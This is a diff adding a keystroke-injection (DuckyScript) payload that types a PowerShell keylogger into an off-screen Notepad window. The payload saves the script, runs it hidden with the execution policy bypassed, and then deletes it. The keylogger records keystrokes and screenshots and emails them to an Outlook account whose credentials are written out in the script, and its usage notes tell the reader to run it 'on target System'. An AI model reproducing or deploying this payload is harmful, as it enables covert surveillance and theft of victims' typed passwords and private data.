@@ -1,0 +1,286 @@
+DELAY 750
+CONTROL ESCAPE
+DELAY 750
+STRING notepad.exe
+ENTER
+DELAY 750
+ENTER
+DELAY 750
+ALT SPACE
+DELAY 750
+STRING m
+DELAY 750
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DELAY 750
+ENTER
+STRING 
+ENTER
+STRING <#
+ENTER
+STRING ============================================= Key Record Script ========================================================
+ENTER
+STRING 
+ENTER
+STRING SYNOPSIS
+ENTER
+STRING This script gathers Keypress information and sends an email to a desired address with the results.
+ENTER
+STRING 
+ENTER
+STRING WARNINGS
+ENTER
+STRING This script Uses smtp Email and requires an OUTLOOK/HOTMAIL Email address to be able to send Emails as
+ENTER
+STRING most other email providers use other protocols.
+ENTER
+STRING 
+ENTER
+STRING USAGE
+ENTER
+STRING 1. Input your credentials below (Hotmail/Outlook ONLY)
+ENTER
+STRING 2. Run Script on target System
+ENTER
+STRING 3. Check Email for results
+ENTER
+STRING 
+ENTER
+STRING #>
+ENTER
+STRING 
+ENTER
+STRING do {
+ENTER
+STRING #===================== INPUT CREDENTIALS HERE =====================
+ENTER
+STRING $FromTo = "johnsmithbail07@outlook.com"
+ENTER
+STRING $Pass = "Universal21!"
+ENTER
+STRING 
+ENTER
+STRING $RunTimeP = 10 # Interval (in minutes) between each email
+ENTER
+STRING #==================================================================
+ENTER
+STRING 
+ENTER
+STRING $TimesToRun = 1
+ENTER
+STRING $Subject = "$env:COMPUTERNAME : : Keylogger Results"
+ENTER
+STRING $body = "$env:COMPUTERNAME : Keylogger Results : $TimeStart"
+ENTER
+STRING $SMTPServer = "smtp-mail.outlook.com"
+ENTER
+STRING $SMTPPort = "587"
+ENTER
+STRING $credentials = New-Object Management.Automation.PSCredential $FromTo,($Pass | ConvertTo-SecureString -AsPlainText -Force)
+ENTER
+STRING $TimeStart = Get-Date
+ENTER
+STRING $TimeEnd = $timeStart.addminutes($RunTimeP)
+ENTER
+STRING 
+ENTER
+STRING function Start-Key ($Path = "$env:temp\logtype.txt")
+ENTER
+STRING {
+ENTER
+STRING $signatures = @'
+ENTER
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+ENTER
+STRING public static extern short GetAsyncKeyState(int virtualKeyCode);
+ENTER
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+STRING public static extern int GetKeyboardState(byte[] keystate);
+ENTER
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+STRING public static extern int MapVirtualKey(uint uCode, int uMapType);
+ENTER
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+STRING public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+ENTER
+STRING '@
+ENTER
+STRING $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -Passthru
+ENTER
+STRING $null = New-Item -Path $Path -ItemType File -Force
+ENTER
+STRING try {
+ENTER
+STRING $Runner = 0
+ENTER
+STRING while ($TimesToRun -ge $Runner) {
+ENTER
+STRING while ($TimeEnd -ge $TimeNow) {
+ENTER
+STRING Start-Sleep -Milliseconds 30
+ENTER
+STRING for ($ascii = 9; $ascii -le 254; $ascii++) {
+ENTER
+STRING $state = $API::GetAsyncKeyState($ascii)
+ENTER
+STRING if ($state -eq -32767) {
+ENTER
+STRING $null = [console]::CapsLock
+ENTER
+STRING $virtualKey = $API::MapVirtualKey($ascii,3)
+ENTER
+STRING $kbstate = New-Object Byte[] 256
+ENTER
+STRING $checkkbstate = $API::GetKeyboardState($kbstate)
+ENTER
+STRING $mychar = New-Object -TypeName System.Text.StringBuilder
+ENTER
+STRING $success = $API::ToUnicode($ascii,$virtualKey,$kbstate,$mychar,$mychar.Capacity,0)
+ENTER
+STRING if ($success) {
+ENTER
+STRING [System.IO.File]::AppendAllText($Path,$mychar,[System.Text.Encoding]::Unicode)
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING $TimeNow = Get-Date
+ENTER
+STRING }
+ENTER
+STRING $Filett = "$env:temp\SC.png"
+ENTER
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING Add-Type -AssemblyName System.Drawing
+ENTER
+STRING $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+ENTER
+STRING $Width = $Screen.Width
+ENTER
+STRING $Height = $Screen.Height
+ENTER
+STRING $Left = $Screen.Left
+ENTER
+STRING $Top = $Screen.Top
+ENTER
+STRING $bitmap = New-Object System.Drawing.Bitmap $Width,$Height
+ENTER
+STRING $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+ENTER
+STRING $graphic.CopyFromScreen($Left,$Top,0,0,$bitmap.Size)
+ENTER
+STRING $bitmap.Save($Filett,[System.Drawing.Imaging.ImageFormat]::png)
+ENTER
+STRING 
+ENTER
+STRING Start-Sleep 3
+ENTER
+STRING Send-MailMessage -From $FromTo -To $FromTo -Subject $Subject -Body $body -Attachment $Path,$filett -SmtpServer $smtpServer -Port $SMTPPort -Credential $credentials -UseSSL
+ENTER
+STRING Remove-Item -Path $Path -Force
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING finally
+ENTER
+STRING {
+ENTER
+STRING $null = New-Item -Path $Path -ItemType File -Force
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING Start-Key
+ENTER
+STRING } while ($a -le 5)
+ENTER
+
+DELAY 500
+ENTER
+CTRL S
+DELAY  800
+STRING %TEMP%\t01dqhmw.ps1
+ENTER
+DELAY 750
+ALT F4
+DELAY 1000
+CONTROL ESCAPE
+DELAY 1000
+STRING powershell.exe --ExecutionPolicy Bypass -WindowStyle Hidden -File %TEMP%\t01dqhmw.ps1
+ENTER
+DELAY 1000
+CONTROL ESCAPE
+DELAY 1000
+STRING powershell.exe Remove-Item %TEMP%\t01dqhmw.ps1 -Force
+ENTER
+DELAY 200
+ESC
